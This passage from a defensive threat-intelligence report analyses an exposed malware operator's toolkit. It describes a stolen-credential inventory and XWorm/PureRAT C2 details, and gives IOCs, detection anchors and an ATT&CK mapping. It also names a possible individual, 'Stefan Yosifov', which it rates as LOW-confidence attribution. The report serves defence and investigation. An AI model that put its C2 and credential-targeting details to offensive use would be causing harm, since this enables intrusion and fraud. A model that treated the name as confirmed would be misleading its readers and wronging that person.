**Sophistication:** Intermediate. Can configure and deploy multiple commodity RAT families simultaneously; capable of developing a custom RAT from scratch to ~60% completion; assembled a three-stage fileless loader chain using established techniques, with the specific samples (Aspdkzb cluster) undocumented publicly prior to this report; NOT capable of consistent operational security (OPSEC) — accidental open-directory exposure of entire toolkit, source code, C2 panel, and credential database.

**Motivation:** Financial — credential monetization, BEC enablement, ransomware-on-demand, cryptocurrency theft

**Nation-state nexus:** EXCLUDED. The commodity tool mix, opportunistic financial targeting, commodity infrastructure, and operational security (OPSEC) failures are all inconsistent with nation-state operational standards. No evidence supports state nexus.

### Alternative Explanations

**Two-person operation (Steffz + "Ziad"):** MODERATE likelihood. The "Ziad" prefix on `ziadxyzhosting[.]com` and `ziadverisontwo[.]com` is inconsistent with the confirmed Steffz identity. A second individual may manage a portion of the infrastructure.

**False flag:** LOW likelihood. Staging a realistic open directory with 32+ binaries, exposing real operator metadata, and leaving Canva account XMP data are inconsistent with deliberate misdirection. OPSEC failure pattern contradicts sophisticated false attribution.

---

## 9. Credential and Victim Data Inventory

> **Plain language:** The attacker stored approximately 9.1 million stolen email addresses and passwords on their server. This section documents what was found and what it means for potential victims.


| File                          | Format             | Entries   | Summary                                                                                                                                                                                  |
| ----------------------------- | ------------------ | --------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `good.txt`                    | email:password     | 4,857,789 | ~4.4M operator-assessed as valid (92.2% of entries); compiled from Gawker (2010) and OMGPOP (2012) breaches; validity rate reflects operator's own sorting, not independent verification |
| `Corp_202M.txt`               | email:password     | 2,000,006 | ~1.4M operator-assessed as valid (68.2% of entries); corporate-focused credentials from Telegram data broker @ddandt02                                                                   |
| `180k_2B.txt`                 | username:password  | 180,953   | ~180K entries; institutional/Active Directory format (username, not email); high likelihood of valid enterprise credentials                                                              |
| `US_Corp_sample.txt`          | email:password     | 10,005    | ~8.9K operator-assessed as valid (89.7% of entries); contains default password cluster (396 entries with "Welcome1") indicating helpdesk origin                                          |
| `BAD-BAK3R.txt`               | BAD=> format       | 58        | Failed Office 365 SMTP attempts; 0 confirmed valid; recent failures logged during operator testing                                                                                       |
| `cleaned_emails.txt`          | email only         | 618,010   | ~618K email addresses (Gmail accounts); no passwords; suitable for targeted phishing or account enumeration                                                                              |
| `1.txt` + `2.txt` (.edu/.org) | email only         | 856,931   | ~857K email addresses; education and nonprofit sector targeting; no passwords; enables targeted BEC against academic/charitable organizations                                            |
| Comcast files (×2)            | email only         | 151,065   | ~151K ISP customer email addresses; no passwords; enables BEC and credential stuffing against ISP portal accounts                                                                        |
| `135k_valid_crypto_leads.txt` | email only         | 133,520   | ~134K email addresses identified as cryptocurrency users; no passwords; prioritized targeting for Raven RAT wallet theft                                                                 |
| `65konlycoinbase.txt`         | email only         | 65,469    | ~65K Coinbase-associated email addresses; no passwords; high-value targets for cryptocurrency theft via HVNC                                                                             |
| Yahoo files (×2)              | email only         | 128,943   | ~129K Yahoo account email addresses; no passwords; enables targeted phishing and account takeover attempts                                                                               |
| `final_links.txt`             | ScreenConnect URLs | 500       | Pre-generated phishing session links with unique UUIDs; all 500 share same static RSA public key; ready for distribution but not yet deployed                                            |


**Total likely-valid credential pairs: ~5,853,394**
**Total entries (all files): ~9,102,793**

**Intelligence notes:**

- `good.txt` contains Gawker (2010) and OMGPOP (2012) breach fingerprint signatures — confirms breach compilation origin; credentials likely reused across current services
- `Corp_202M.txt` footer: `"Data provided by Immanuel Kant / A.K.A.Data Library / Telegram - @ddandt02 / Discord - datalibrary"` — data broker attribution
- `US_Corp_sample.txt`: 396 entries sharing password `Welcome1` — default helpdesk credential cluster indicating Active Directory/enterprise origin
- `180k_2B.txt`: `username:password` format (not `email:password`) — institutional/Active Directory credential format

- `NTUSER.DAT` registry hive files were also recovered from the staging server alongside the credential databases. NTUSER.DAT is a Windows user registry hive containing saved application credentials, browser data, and account settings from a specific user's machine. Their presence on the operator's staging server suggests active exfiltration of victim registry hives — credential harvesting that goes beyond bulk list usage. This is consistent with Initial Access Broker (IAB) behavior: gaining deep access to victim machines, harvesting identity material, and staging it for later monetization or resale.

**Targeting profile:** Corporate O365/BEC focus; cryptocurrency users (Coinbase 65k, crypto leads 135k); ISP subscribers (Comcast 151k); education/nonprofit (857k); Gmail (618k); Yahoo (129k)

---

## 10. Incident Response Guidance

> **Plain language:** If you believe you may have been infected by this malware, this section outlines the categories of action to consider. This is not a step-by-step procedure — engage qualified incident response specialists for execution.

### Priority 1: Immediate Containment

**Isolate affected systems** — prevent lateral movement to other network resources while preserving forensic state for investigation. Avoid powering off systems with potential volatile memory evidence.

**Block confirmed C2 infrastructure** — apply immediate network blocks for `185.49.126.140` on all ports, `74.0.42.25`, `74.0.42.162`, `74.0.42.44`, and `185.49.126.97`. Any connection to `185.49.126.140` on ports 5000, 8000, 8041, 443, 56001, 56002, or 56003 is confirmed malicious.

**Block operator domains** — `adminxyzhosting[.]com`, `chainconnects[.]net`, and MODERATE-confidence domains `ziadxyzhosting[.]com`, `ziadverisontwo[.]com`, `wireon[.]work[.]gd`, `ledno[.]net`.

**ScreenConnect audit** — enumerate all ScreenConnect sessions relaying through `adminxyzhosting[.]com:8041`. Any session connected to this relay represents confirmed attacker access. The static RSA public key the static RSA public key from all operator-generated session links (documented in Section 10 investigation guidance) is present in all operator-generated session links — matching this key in ScreenConnect configuration identifies attacker-established sessions.

**Credential rotation** — prioritize accounts with elevated privileges, domain administrator access, and any service accounts accessible from potentially affected systems.

### Priority 2: Investigation

Deploy detection signatures from the [detection file]({{ "/hunting-detections/opendirectory-74-0-42-25-20260316-detections/" | relative_url }}). Hunt for:

- Mutex `5tK099W0Z6AMZVxQ` in process memory (XWorm)
- Registry key `HKCU\SOFTWARE\XWorm`
- Registry key `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\vlctask`
- Registry key `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsService`
- File `%TEMP%\test_debug.txt` (ScreenConnect dropper debug log)
- Outbound TCP to `185.49.126.140:56001/56002/56003` with `\x04\x00\x00\x00` preamble (PureRAT)
- ScreenConnect processes with parent process `wscript.exe` or `msiexec.exe`

Conduct network-wide threat hunt for lateral movement and persistence indicators across all endpoints and servers.

### Priority 3: Scope Assessment

Determine the full extent of compromise: affected systems, data accessed, credentials potentially captured by keylogger or browser theft plugin, whether the XWorm ransomware module was deployed, whether PureHVNC established hidden browser sessions against financial or email accounts.

Assess whether any of the 9.1M credential pairs in the operator's database include accounts associated with your organization — particularly Office 365 accounts.

### Priority 4: Remediation Approach

Persistence mechanisms identified in this campaign are user-space (Registry Run keys, ScreenConnect service). Full system rebuild is not categorically required, but is the higher-confidence remediation path.

**ScreenConnect:** Because ScreenConnect is a legitimate application, standard malware removal tools may not uninstall it. Targeted removal of the ScreenConnect installation is required, specifically sessions connected to `adminxyzhosting[.]com`.

**Credential reset scope:** Assume any credentials entered on affected systems since the estimated infection date were captured by XWorm's keylogger.

---

## 11. Defensive Hardening Recommendations

> **Plain language:** This section describes security capabilities that would reduce the risk from this type of attack — not just for this specific campaign, but for similar threats in the future.

### Security Control Gaps This Campaign Exploits

**Endpoint behavioral monitoring:** XwormLoader's reflective PE loading and the Aspdkzb fileless chain both bypass signature-based antivirus. Behavioral endpoint detection that monitors for `VirtualAlloc(PAGE_EXECUTE_READWRITE)` + `CreateThread` sequences would detect XwormLoader's injection. `Assembly.Load()` calls from obfuscated .NET assemblies should trigger investigation.

**Application control and execution restrictions:** `Attachment.vbs` requires the Windows Script Host (`wscript.exe`) to execute. Environments with script execution restrictions (blocking `.vbs` execution or requiring signed scripts) would prevent this delivery vector. PowerShell constrained language mode would reduce the effectiveness of `puf.ps1`/`sync.ps1` fileless droppers.

**Remote access software inventory:** ConnectWise ScreenConnect is abused here because it is allow-listed in many environments. Maintaining an authorized remote access software inventory and alerting on unauthorized installations — specifically those connecting to non-corporate relay servers — would detect this vector.

**DNS monitoring:** The DGA behavior in `vlc_boxed.exe` generates unusual DNS queries through `svchost.exe`. DNS monitoring for algorithmically generated domain names, particularly from process contexts inconsistent with normal DNS activity, provides detection coverage.

**Network egress filtering:** All four C2 services converge on `185.49.126.140`. Perimeter egress filtering with IP reputation blocking would disrupt all four families simultaneously. The PureRAT `\x04\x00\x00\x00` preamble is detectable at the network layer before TLS encryption.

**Credential stuffing defenses:** BAK3R's SMTP credential stuffing approach (25 concurrent SMTP AUTH attempts) is detectable at the email gateway level. Rate limiting on SMTP AUTH, combined with anomalous authentication monitoring for Office 365 (multiple failed authentication attempts followed by success from unusual source IPs), provides defense-in-depth.

**CVE-2025-30406 patching:** Any ASP.NET application with internet-facing endpoints should audit its `web.config` for hardcoded `machineKey` values and ensure all instances are patched. The `generator` value `3FE2630A` is victim-specific — if this exact value appears in your ASP.NET application's configuration, this campaign has specifically targeted your environment.

### Process Maturity

**Detection rule deployment:** The [detection file]({{ "/hunting-detections/opendirectory-74-0-42-25-20260316-detections/" | relative_url }}) contains YARA rules, Sigma rules, Suricata signatures, EDR queries, and SIEM queries covering the key IOCs and behavioral patterns from this campaign.

**Threat hunting coverage:** The MITRE ATT&CK techniques in this campaign (see Appendix A) span 13 tactics. Hunting coverage for T1620 (Reflective Code Loading) and T1497 (Virtualization/Sandbox Evasion) would provide early detection of XwormLoader and vlc_boxed.exe respectively.

---

## 12. Confidence Levels Summary

> **Plain language:** Every claim in this report has a confidence rating. This section summarizes the highest-confidence findings (things we know for certain) and lower-confidence areas (where we need more evidence).

### DEFINITE (Direct evidence, no ambiguity)

- XWorm V5.6 family identification — full decompilation; C2 config decrypted
- PureHVNC family identification — internal name `PureHVNC_GUI` in config file
- Raven RAT family identification — full source code recovered
- ScreenConnect abuse — DomainTools Iris HTTP server header confirmed
- `185.49.126.140` as active C2 for XWorm (port 5000), PureHVNC (port 8000), PureRAT (ports 56001–56003), ScreenConnect (ports 443/8041)
- `74.0.42.25` as open directory/staging server
- Operator handle `Steffz` — hardcoded in `vicTest.exe` DFM
- Panel build date 2025-04-13 — binary metadata
- Canva account name `Stefan Yosifov` — XMP metadata value in `Main.dfm` (artifact value only; real-world identity not confirmed)
- BAK3R attribution to `@BAK34_TMW` — source code attribution string
- Ransomware module presence (103KB embedded resource in `Xworm_V5.6.exe`)
- vlc_boxed.exe sandbox environment detection — `Noriben\dll_log.txt` probe at T+1s

### HIGH (Strong evidence, minor gaps)

- PureRAT v4.1.9 family identification — 88% (11 of 11 published signatures matched)
- `@ZeroTraceDevOfficial` Telegram as operator channel — binary artifacts + CYFIRMA independent corroboration
- `monroe31s` GitHub as operator account — CYFIRMA confirmed
- AS40662 attribution for 74.0.42.x cluster — 3-source cross-validation, ROA-validated
- `adminxyzhosting[.]com` WHOIS and PTR — retrieved and confirmed
- Aspdkzb loader chain delivers PureRAT v4.1.9 — extraction chain confirmed
- XwormLoader reflective loading of XWorm payload — full reverse engineering
- `steffz` in ZeroTrace portfolio — CYFIRMA independent corroboration
- Compiler: Embarcadero Delphi 12.0 Athens Enterprise — PE header analysis
- PureRAT TLS cert `NotBefore: 2024-11-21` — certificate extracted from binary
- CVE-2025-30406 exploit kit structure — consistent with CISA KEV and Huntress documentation
- DGA behavior in vlc_boxed.exe — dynamically confirmed (FakeNet DNS queries)

### MODERATE (Reasonable evidence, notable gaps)

- AS834/IPXO as C2 hosting provider — IPinfo + BGP.he.net agreement; AS199654 discrepancy noted and explained
- Bulletproof hosting characterization for AS834 — 3 of 6 indicators present; not definitive
- wireon.work.gd as PureRAT fallback domain — DNS timeline correlation
- ziadxyzhosting.com and ziadverisontwo.com as actor-controlled — naming pattern match; WHOIS unavailable
- puf.ps1/sync.ps1 payloads as Aspdkzb-family — size correlation; inner PE not extracted
- Infrastructure attribution to ZeroTrace (72%) — digital identity artifacts + 1 Tier 2 source; ZeroTrace components confirmed, broader campaign scope inferred
- "Two-person operation" (Steffz + Ziad) hypothesis — naming pattern evidence

### LOW (Weak or circumstantial evidence)

- Stefan Yosifov as real-world identity — single source (XMP metadata), no corroboration
- ledno.net as actor-controlled domain — PTR function confirmed; direct C2 role unconfirmed
- Raven RAT C2 IP as 185.49.126.140 (port 8777) — inferred from infrastructure pattern; unconfirmed

### INSUFFICIENT (Cannot assess with available evidence)

- vlc_boxed.exe inner payload family — Enigma Virtual Box prevents static analysis; DGA domains not captured
- PureRAT mutex name and persistence flag — ProtoBuf decode not completed
- DGA domain names generated by vlc_boxed.exe — FakeNet logs absent; PCAP available for future extraction
- Bulletproof hosting characterization for AS40662 — new ASN; no reputation history

---

## 13. FAQ

**Q1: "Should we assume the XWorm ransomware module has already been deployed?"**
Short answer: No — but the capability exists and there is no warning before deployment.

The ransomware module is delivered via the ENC/DEC plugin interface from the operator's panel. The operator must manually push it. If XWorm is detected on a system, the priority is isolation before the operator notices — not waiting to confirm whether ransomware has been activated. The embedded module's presence (`XWorm.Ransomware.resources` as a binary resource in the builder) is confirmed; deployment to any individual victim is operator-dependent.

---

**Q2: "ScreenConnect is an approved remote access tool in our environment. How do we distinguish legitimate use from this threat?"**
Short answer: By the relay server and session key, not the software itself.

Legitimate ScreenConnect deployments use your organization's own relay server (typically a subdomain of your domain or a ScreenConnect-hosted relay). Attacker-established sessions in this campaign route through `adminxyzhosting[.]com:8041`. Additionally, all 500 attacker-generated session links share the same static RSA public key (documented in Section 10 investigation guidance). Auditing ScreenConnect sessions for non-corporate relay servers and unknown RSA keys identifies attacker-established access.

---

**Q3: "The PureRAT C2 ports 56001–56003 are unusual. Can we just block these ports?"**
Short answer: Yes — and doing so disrupts PureRAT entirely. But this is not sufficient alone.

PureRAT strictly uses ports 56001–56003 for this build (tried in sequence on reconnect). Blocking these ports at the perimeter eliminates PureRAT C2 traffic from this build. However, XWorm uses port 5000, PureHVNC uses port 8000, and ScreenConnect uses ports 443 and 8041. The most efficient single action is blocking `185.49.126.140` entirely — which disrupts all four families simultaneously.

---

**Q4: "The validationKey in the CVE-2025-30406 exploit kit — does this mean our environment was targeted?"**
Short answer: Only if the generator value `3FE2630A` matches a value in your web.config.

The generator value is mathematically derived from the physical path of the web application on the server's filesystem. If your ASP.NET application's `web.config` generates a `generator` value of `3FE2630A`, your organization is the specific target of this exploit kit. This value is unique to one application instance. Most organizations will not match this value. Any organization operating Gladinet CentreStack or Triofox should patch regardless of this specific campaign.

---

**Q5: "The operator's name 'Stefan Yosifov' was found. Does this mean we can attribute this to a specific person?"**
Short answer: No — treat it as an investigative lead, not confirmed attribution.

The name was recovered as the `pdf:Author` XMP metadata field from a Canva account that created the Raven RAT logo. This is a single-source artifact with no independent corroboration in accessible open-source intelligence. The Canva metadata reflects the account name, not necessarily the actual developer's legal name. This should be treated as a lead for further OSINT investigation, not as a legal or definitive attribution. Confidence for this as a real-world identity: LOW.

---

**Q6: "The toolkit has been active for 16+ months. Why wasn't it detected earlier?"**
Short answer: The combination of legitimate software abuse, fileless loading, and novel undocumented samples made detection difficult.

Key factors: (1) ScreenConnect is a legitimate application — most security tools do not flag it as malicious. (2) The PureRAT samples (`Faidowra.dll`, `Zvafsyattl.exe`) were not in public sandbox databases at analysis date, meaning hash-based detection was unavailable. (3) The Aspdkzb three-stage loader chain was undocumented — no published signatures existed. (4) The C2 server `185.49.126.140` had no prior public intelligence, meaning IP reputation tools did not flag it. This underscores why behavioral detection and threat hunting are necessary complements to signature-based approaches.

---

**Q7: "Should we report this to law enforcement?"**
Short answer: That is an organizational decision outside the scope of this third-party report.

This report documents confirmed malicious infrastructure and provides IOCs for defensive action. Decisions about law enforcement reporting involve legal, jurisdictional, and organizational considerations that are organization-specific. The evidence quality in this report — particularly the digital identity artifacts and infrastructure documentation — may be of investigative value.

---

## 14. IOCs

> **Plain language:** IOCs (Indicators of Compromise) are technical fingerprints defenders can use to detect this malware in their environment — file hashes, IP addresses, domain names, and behavioral patterns.

The complete machine-readable IOC feed is available in the structured JSON format:

**IOC Feed:** [{{ "/ioc-feeds/opendirectory-74-0-42-25-20260316-iocs.json" | relative_url }}]({{ "/ioc-feeds/opendirectory-74-0-42-25-20260316-iocs.json" | relative_url }})

**IOC Summary:**

- File hashes (SHA256): 34 samples across all families
- Network IOCs (confirmed DEFINITE): C2 IP `185.49.126.140` (7 ports), staging IPs `74.0.42.25`, `74.0.42.162`, `74.0.42.44`, `185.49.126.97`, domains `adminxyzhosting[.]com`, `chainconnects[.]net`
- Network IOCs (MODERATE confidence): `wireon[.]work[.]gd`, `ziadxyzhosting[.]com`, `ziadverisontwo[.]com`, `ledno[.]net`
- Host IOCs: Mutexes `5tK099W0Z6AMZVxQ` (XWorm) and `x` (Raven RAT); Registry keys (3 confirmed); PureRAT TLS CN `Ayzyqztcoa`
- Behavioral indicators: TCP preamble `\x04\x00\x00\x00` (PureRAT); XWorm protocol separator `<Xwormmm>` in memory/traffic
- Protocol strings: `<Xwormmm>`, `USB.exe`, `New Clinet :`  (XWorm Telegram notification typo)

**High-Reliability Detection Anchors:**

- `**5tK099W0Z6AMZVxQ`** — XWorm V5.6 mutex; plaintext in binary; also the AES key derivation seed; not user-configurable in V5.6
- `**\x04\x00\x00\x00`** — PureRAT TCP preamble; appears before TLS handshake on ports 56001–56003; network-detectable before encryption
- `**Faidowra.IO.ModelConfiguration`** — PureRAT v4.1.9 namespace; specific to this build's deobfuscation
- `**Ayzyqztcoa`** — PureRAT TLS certificate CN; auto-generated per build; unique to this campaign instance
- `**%TEMP%\test_debug.txt`** — ScreenConnect dropper debug artifact; contains timestamps and HTTP status codes; OPSEC failure indicator

---

## 15. Detections

> **Plain language:** Detection rules help security tools automatically identify this malware based on its technical characteristics. The full rule set is in a separate file for direct import into security tools.

**Detection Rules File:** [{{ "/hunting-detections/opendirectory-74-0-42-25-20260316-detections/" | relative_url }}]({{ "/hunting-detections/opendirectory-74-0-42-25-20260316-detections/" | relative_url }})

**Detection coverage includes:**

- **YARA rules:** File-based detection for XWorm V5.6 stubs, XwormLoader, PureRAT v4.1.9 (Faidowra.dll), Aspdkzb loader cluster, Raven RAT (vicTest.exe and RavenOriginalStub.exe), CVE-2025-30406 exploit kit
- **Sigma rules:** Log-based behavioral detection for XWorm Registry writes, vlc_boxed.exe persistence, ScreenConnect silent install via wscript, PureRAT TCP preamble pattern, XwormLoader reflective load behaviors
- **Suricata signatures:** Network detection for XWorm C2 traffic (port 5000, `<Xwormmm>` separator), PureRAT C2 (TCP preamble + TLS pattern on 56001–56003), ScreenConnect relay to `adminxyzhosting[.]com`
- **EDR queries:** Behavioral queries for registry-based persistence, wscript spawning msiexec, PowerShell fileless execution patterns, VirtualAlloc+CreateThread sequences
- **SIEM queries:** Common SIEM platform queries for network connections to C2 infrastructure and behavioral indicators

---

## 16. Appendix A — MITRE ATT&CK Mapping

> **Plain language:** MITRE ATT&CK is a publicly available framework that categorizes attacker behaviors. This table maps every technique used by this malware to the framework, helping defenders understand what stage of an attack each behavior represents.


| Tactic               | Technique ID | Technique Name                             | Component                                                            | Confidence |
| -------------------- | ------------ | ------------------------------------------ | -------------------------------------------------------------------- | ---------- |
| Resource Development | T1583.001    | Acquire Infrastructure: Domains            | chainconnects.net, adminxyzhosting.com                               | HIGH       |
| Resource Development | T1588.001    | Obtain Capabilities: Malware               | XWorm V5.6, PureRAT v4.1.9                                           | HIGH       |
| Initial Access       | T1566.001    | Phishing: Spearphishing Attachment         | Attachment.vbs                                                       | HIGH       |
| Initial Access       | T1190        | Exploit Public-Facing Application          | CVE-2025-30406 exploit.py                                            | HIGH       |
| Execution            | T1059.001    | PowerShell                                 | puf.ps1, sync.ps1; XWorm DW command                                  | HIGH       |
| Execution            | T1059.005    | Visual Basic                               | Attachment.vbs                                                       | HIGH       |
| Execution            | T1218.007    | Msiexec                                    | ScreenConnect silent install                                         | HIGH       |
| Persistence          | T1547.001    | Registry Run Keys / Startup Folder         | Raven WindowsService; vlc_boxed vlctask                              | HIGH       |
| Privilege Escalation | T1548.002    | Bypass UAC                                 | Attachment.vbs runas; XWorm UACFunc                                  | MODERATE   |
| Defense Evasion      | T1055.002    | PE Injection                               | XwormLoader reflective PE injection                                  | HIGH       |
| Defense Evasion      | T1027        | Obfuscated Files or Information            | XWorm AES config; ConfuserEx on Aspdkzb                              | HIGH       |
| Defense Evasion      | T1027.002    | Software Packing                           | BoxedApp SDK on PureRAT.exe; Enigma VB on vlc_boxed.exe              | HIGH       |
| Defense Evasion      | T1620        | Reflective Code Loading                    | XWorm FM command AppDomain.Load; Aspdkzb Assembly.Load               | HIGH       |
| Defense Evasion      | T1036.005    | Match Legitimate Name or Location          | XwormLoader LDR path spoof; calc.exe; vlc_boxed.exe                  | HIGH       |
| Defense Evasion      | T1497.001    | System Checks (Sandbox Evasion)            | XWorm ip-api.com hosting environment query                           | HIGH       |
| Defense Evasion      | T1497.001    | System Checks (Sandbox Evasion)            | vlc_boxed.exe Noriben behavioral sandbox detection (file path probe) | HIGH       |
| Defense Evasion      | T1070.004    | File Deletion                              | XWorm Uninstaller bat-based self-delete                              | HIGH       |
| Credential Access    | T1056.001    | Keylogging                                 | XWorm keylogger; Raven GetAsyncKeyState polling                      | HIGH       |
| Credential Access    | T1110.004    | Credential Stuffing                        | BAK3R Office 365 SMTP stuffing                                       | HIGH       |
| Discovery            | T1082        | System Information Discovery               | XWorm INFO beacon (CPU/GPU/RAM/OS/arch)                              | HIGH       |
| Discovery            | T1518.001    | Security Software Discovery                | XWorm Antivirus() WMI SecurityCenter2 query                          | HIGH       |
| Collection           | T1113        | Screen Capture                             | XWorm $Cap; Raven GDI+ PNG; PureHVNC                                 | HIGH       |
| Collection           | T1005        | Data from Local System                     | Raven wallet theft (Exodus/Atomic/Guarda/Wasabi)                     | HIGH       |
| Collection           | T1115        | Clipboard Data                             | XWorm Clipper — crypto address replacement                           | HIGH       |
| Command and Control  | T1219        | Remote Access Software                     | ScreenConnect ConnectWise v23.2.9 abuse                              | HIGH       |
| Command and Control  | T1573.002    | Encrypted Channel: Asymmetric Cryptography | PureRAT 4096-bit RSA cert pinning; ScreenConnect RSA                 | HIGH       |
| Command and Control  | T1568.002    | Dynamic Resolution: DGA                    | vlc_boxed.exe DGA behavior confirmed dynamically                     | HIGH       |
| Command and Control  | T1105        | Ingress Tool Transfer                      | XWorm LN/DW commands; ScreenConnect file transfer                    | HIGH       |
| Lateral Movement     | T1091        | Replication Through Removable Media        | XWorm USB.exe spreading                                              | HIGH       |
| Lateral Movement     | T1021.005    | Remote Services: VNC                       | PureHVNC; ScreenConnect RMM; Raven HVNC                              | HIGH       |
| Exfiltration         | T1041        | Exfiltration Over C2 Channel               | XWorm screenshot/keylog/system data via C2                           | HIGH       |
| Impact               | T1486        | Data Encrypted for Impact                  | XWorm ransomware module (ENC/DEC plugin — on-demand)                 | HIGH       |
| Impact               | T1498.001    | Direct Network Flood                       | XWorm StartDDos HTTP slow-POST flood                                 | HIGH       |
| Impact               | T1491.001    | Internal Defacement                        | XWorm Shosts — hosts file overwrite                                  | HIGH       |


---

## 17. Appendix B — Research References

**XWorm V5.6:**

- Trellix (2025): XWorm V5.6 technical analysis — AES-256 ECB config, Telegram notification, ransomware module documentation
- Cofense (2025): XWorm global detection volume and campaign tracking
- CloudSEK (2024–2025): "XWorm V5.6 cracked builder distribution and supply-chain compromise" — documents 18,000+ device compromises from trojanized builder; cracked V5.6 proliferation post-developer departure

**PureRAT v4.1.9 / ResolverRAT:**

- Netresec (August 2025): "PureRAT = ResolverRAT = PureHVNC" — `\x04\x00\x00\x00` TCP preamble, TLS `NotAfter: 9999-12-31`, ports 56001–56003, TLS 1.0 architecture
- Check Point Research (2025): PureRAT v4.1.9 analysis — version string, Base64→GZip→ProtoBuf config, TLS cert pinning, .NET Reactor 6.x
- Fortinet (2025): PureRAT technical analysis — config encoding, .NET Reactor obfuscation corroboration
- Morphisec (April 2025): "ResolverRAT" — coins alias for same codebase; healthcare/pharmaceutical targeting
- Derp.ca (community researcher blog — Tier 3): 86-type ProtoBuf union, 20–40 second heartbeat, 4-byte length prefix, campaign tag "Default"

**Raven RAT / ZeroTrace:**

- CYFIRMA (2025): "Raven Stealer Unmasked" — ZeroTrace Team identity, `@ZeroTraceDevOfficial`, `monroe31s`, `steffz` handle in Octalyn Stealer builder artifacts
- GitHub: `monroe31s/Raven-RAT` — [github.com/monroe31s/Raven-RAT](https://github.com/monroe31s/Raven-RAT); created 2025-05-01; 7 stars, 5 forks; `@ZeroTraceDevOfficial` Telegram link confirmed

**ConnectWise ScreenConnect Abuse:**

- CyberProof (2025): ScreenConnect documented as frequently abused legitimate remote tool in 2024–2025, appearing across active threat reports involving legitimate RMM/RAT abuse; SSA impersonation phishing pattern documentation

**CVE-2025-30406:**

- CISA KEV Catalog (April 2025): CVE-2025-30406 added to Known Exploited Vulnerabilities — [cisa.gov/known-exploited-vulnerabilities-catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
- NVD/CVE: CVE-2025-30406 — CVSS 9.0; Gladinet CentreStack and Triofox affected products
- Huntress (April 2025): CVE-2025-30406 technical analysis — seven confirmed organizational compromises; CL0P ransomware group exploitation documented
- ysoserial.net documentation: `pwntester/ysoserial.net` — `TextFormattingRunProperties` gadget chain documentation

**Infrastructure:**

- IPinfo.io: ASN lookup data for AS834 (IPXO LLC), AS40662 (Layer7 Technologies Inc)
- BGP.he.net: PTR record confirmation for `adminxyzhosting.com` to `185.49.126.140`; ROA validation for AS40662; /24 co-host enumeration for `185.49.126.0/24`
- CleanTalk (cleantalk.org/blacklists/as834): AS834 spam tracking

---

## License

© 2025 Joseph. All rights reserved. See LICENSE for terms.